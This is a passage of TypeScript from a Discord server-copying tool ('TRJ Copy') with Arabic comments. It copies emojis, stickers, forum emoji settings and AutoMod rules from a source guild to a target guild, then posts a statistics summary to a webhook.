        for (let i = 0; i < sEmojis.length; i++) {
          const emoji = sEmojis[i];
          try {
            const imageUrl = emoji.animated
              ? `https://cdn.discordapp.com/emojis/${emoji.id}.gif`
              : `https://cdn.discordapp.com/emojis/${emoji.id}.png`;
            const dataUri = await downloadAsDataURI(imageUrl, emoji.animated ? 'image/gif' : 'image/png');
            if (!dataUri) {
              stats.errors++;
              continue;
            }

            const emojiRoles: string[] = [];
            if (emoji.roles && Array.isArray(emoji.roles)) {
              for (const rid of emoji.roles) {
                if (roleMap[rid]) emojiRoles.push(roleMap[rid]);
              }
            }

            const res2 = await df('POST', `/guilds/${targetId}/emojis`, {
              name: emoji.name,
              image: dataUri,
              roles: emojiRoles,
            });
            if (res2.ok && res2.data?.id) {
              stats.emojis++;
              emojiMap[emoji.id] = res2.data.id;
            } else {
              stats.errors++;
            }
          } catch {
            stats.errors++;
          }
          send({ type: 'progress', message: `😀 إيموجي ${stats.emojis}/${sEmojis.length}: ${emoji.name}` });
          await delay(700);
        }
        send({ type: 'stats', stats });
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 10: تحديث إيموجي الفورم بالمعرفات الجديدة
      // ═══════════════════════════════════════════════════════════════
      if (Object.keys(emojiMap).length > 0 && Object.keys(channelMap).length > 0) {
        let forumUpdated = 0;
        for (const [srcChId, tgtChId] of Object.entries(channelMap)) {
          const srcCh = sChannels.find((c: any) => c.id === srcChId);
          if (!srcCh || (srcCh.type !== 15 && srcCh.type !== 16)) continue;
          if (!srcCh.default_reaction_emoji || !srcCh.default_reaction_emoji.emoji_id) continue;

          const srcEmojiId = srcCh.default_reaction_emoji.emoji_id;
          const newEmojiId = emojiMap[srcEmojiId];
          if (!newEmojiId) continue;

          try {
            await df('PATCH', `/channels/${tgtChId}`, {
              default_reaction_emoji: { emoji_id: newEmojiId },
            });
            forumUpdated++;
            await delay(300);
          } catch { /* skip */ }
        }
        if (forumUpdated > 0) {
          send({ type: 'progress', message: `💬 تم تحديث ${forumUpdated} إيموجي فورم` });
        }

        // تحديث tags اللي فيها إيموجي مخصصة
        let tagsUpdated = 0;
        for (const [srcChId, tgtChId] of Object.entries(channelMap)) {
          const srcCh = sChannels.find((c: any) => c.id === srcChId);
          if (!srcCh || (srcCh.type !== 15 && srcCh.type !== 16)) continue;
          if (!srcCh.available_tags || !Array.isArray(srcCh.available_tags)) continue;

          const hasCustomEmojiTags = srcCh.available_tags.some((tag: any) => tag.emoji_id && emojiMap[tag.emoji_id]);
          if (!hasCustomEmojiTags) continue;

          try {
            const newTags = srcCh.available_tags.map((tag: any) => ({
              name: tag.name,
              moderated: tag.moderated || false,
              emoji_id: (tag.emoji_id && emojiMap[tag.emoji_id]) || null,
              emoji_name: tag.emoji_name || null,
            }));
            await df('PATCH', `/channels/${tgtChId}`, { available_tags: newTags });
            tagsUpdated++;
            await delay(300);
          } catch { /* skip */ }
        }
        if (tagsUpdated > 0) {
          send({ type: 'progress', message: `🏷️ تم تحديث ${tagsUpdated} تاج إيموجي` });
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 11: نسخ الستيكرز
      // ═══════════════════════════════════════════════════════════════
      if (sStickers.length > 0) {
        send({ type: 'progress', message: `🎨 جاري نسخ ${sStickers.length} ستكر...` });

        for (let i = 0; i < sStickers.length; i++) {
          const sticker = sStickers[i];

          // Lottie stickers لا يمكن إعادة رفعها
          if (sticker.format_type === 3) {
            send({ type: 'progress', message: `⏭️ تخطي ستكر Lottie: ${sticker.name}` });
            stats.errors++;
            continue;
          }

          try {
            let ext = 'png';
            let mime = 'image/png';
            if (sticker.format_type === 2) {
              ext = 'gif';
              mime = 'image/gif';
            } else if (sticker.format_type === 4) {
              ext = 'webp';
              mime = 'image/webp';
            }

            const imgUrl = `https://cdn.discordapp.com/stickers/${sticker.id}.${ext}`;
            const imgRes = await fetch(imgUrl, { signal: AbortSignal.timeout(25000) });

            if (imgRes.ok) {
              const buf = await imgRes.arrayBuffer();
              const fd = new FormData();
              fd.append('name', sticker.name);
              fd.append('description', sticker.description || '');
              fd.append('tags', sticker.tags || '');
              fd.append('file', new File([buf], `${sticker.name}.${ext}`, { type: mime }));

              const res2 = await dFetchFormData(auth, `${DISCORD_API}/guilds/${targetId}/stickers`, fd);
              if (res2.ok) stats.stickers++;
              else stats.errors++;
            } else {
              // Fallback to PNG
              const fallbackUrl = `https://cdn.discordapp.com/stickers/${sticker.id}.png`;
              const fallbackRes = await fetch(fallbackUrl, { signal: AbortSignal.timeout(25000) });
              if (fallbackRes.ok) {
                const buf = await fallbackRes.arrayBuffer();
                const fd = new FormData();
                fd.append('name', sticker.name);
                fd.append('description', sticker.description || '');
                fd.append('tags', sticker.tags || '');
                fd.append('file', new File([buf], `${sticker.name}.png`, { type: 'image/png' }));

                const res2 = await dFetchFormData(auth, `${DISCORD_API}/guilds/${targetId}/stickers`, fd);
                if (res2.ok) stats.stickers++;
                else stats.errors++;
              } else {
                stats.errors++;
              }
            }
          } catch {
            stats.errors++;
          }
          send({ type: 'progress', message: `🎨 ستكر ${stats.stickers}/${sStickers.length}: ${sticker.name}` });
          await delay(800);
        }
        send({ type: 'stats', stats });
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 12: نسخ أوتو مود
      // ═══════════════════════════════════════════════════════════════
      if (sAutoMod.length > 0) {
        send({ type: 'progress', message: `🤖 جاري نسخ ${sAutoMod.length} قاعدة أوتو مود...` });

        for (let i = 0; i < sAutoMod.length; i++) {
          const rule = sAutoMod[i];
          try {
            const actions = (rule.actions || []).map((a: any) => {
              const action: any = { type: a.type };
              if (a.metadata && Object.keys(a.metadata).length > 0) {
                action.metadata = { ...a.metadata };
                if (action.metadata.channel_id && channelMap[action.metadata.channel_id]) {
                  action.metadata.channel_id = channelMap[action.metadata.channel_id];
                } else if (action.metadata.channel_id) {
                  delete action.metadata.channel_id; // القناة ما انشاءت
                }
                if (action.metadata.role_id && roleMap[action.metadata.role_id]) {
                  action.metadata.role_id = roleMap[action.metadata.role_id];
                } else if (action.metadata.role_id) {
                  delete action.metadata.role_id; // الرتبة ما انشاءت
                }
              }
              return action;
            });

            const exemptRoles = (rule.exempt_roles || [])
              .map((rid: string) => roleMap[rid])
              .filter(Boolean);
            const exemptChannels = (rule.exempt_channels || [])
              .map((cid: string) => channelMap[cid])
              .filter(Boolean);

            const res2 = await df('POST', `/guilds/${targetId}/auto-moderation/rules`, {
              name: rule.name,
              enabled: rule.enabled !== false,
              event_type: rule.event_type,
              trigger_type: rule.trigger_type,
              trigger_metadata: rule.trigger_metadata || {},
              actions,
              exempt_roles: exemptRoles,
              exempt_channels: exemptChannels,
            });
            if (res2.ok) stats.autoMod++;
            else stats.errors++;
          } catch {
            stats.errors++;
          }
          send({ type: 'progress', message: `🤖 أوتو مود ${stats.autoMod}/${sAutoMod.length}: ${rule.name}` });
          await delay(500);
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // النتيجة النهائية
      // ═══════════════════════════════════════════════════════════════
      const doneEmbed = {
        username: 'TRJ Copy',
        embeds: [{
          title: '✅ Copy Completed',
          color: 0x00ff41,
          fields: [
            { name: '🎭 Roles', value: String(stats.roles), inline: true },
            { name: '📁 Cats', value: String(stats.cats), inline: true },
            { name: '💬 Text', value: String(stats.txt), inline: true },
            { name: '🔊 Voice', value: String(stats.voice), inline: true },
            { name: '💬 Forums', value: String(stats.forums), inline: true },
            { name: '😀 Emojis', value: String(stats.emojis), inline: true },
            { name: '🎨 Stickers', value: String(stats.stickers), inline: true },
            { name: '🤖 AutoMod', value: String(stats.autoMod), inline: true },
            { name: '🔐 Permissions', value: String(stats.permissions), inline: true },
            { name: '🖼️ Icon', value: stats.icon ? 'Yes' : 'No', inline: true },
            { name: '🌈 Banner', value: stats.banner ? 'Yes' : 'No', inline: true },
            { name: '❌ Errors', value: String(stats.errors), inline: true },
          ],
          timestamp: new Date().toISOString(),
        }],
      };
      sendToWebhook(doneEmbed, whUrl).catch(() => {});

      const summary = [
        `✅ تم النسخ!`,
        `${stats.roles} رتب | ${stats.cats} كاتيجوري | ${stats.txt} كتابي | ${stats.voice} صوتي | ${stats.forums} فورم`,
        `${stats.emojis} إيموجي | ${stats.stickers} ستكر | ${stats.autoMod} أوتو مود`,
        `${stats.permissions} صلاحية`,
        stats.icon ? '🖼️ أيقونة' : '',
        stats.banner ? '🌈 بانر' : '',
        stats.splash ? '💦 سبلش' : '',
        `${stats.errors} أخطاء`,
      ]
        .filter(Boolean)
        .join(' | ');

      send({ type: 'done', success: true, stats, message: summary });
    });
  } catch (e: unknown) {
    const msg = e instanceof Error ? e.message : 'خطأ غير متوقع';
    return errRes(msg);
  }
}
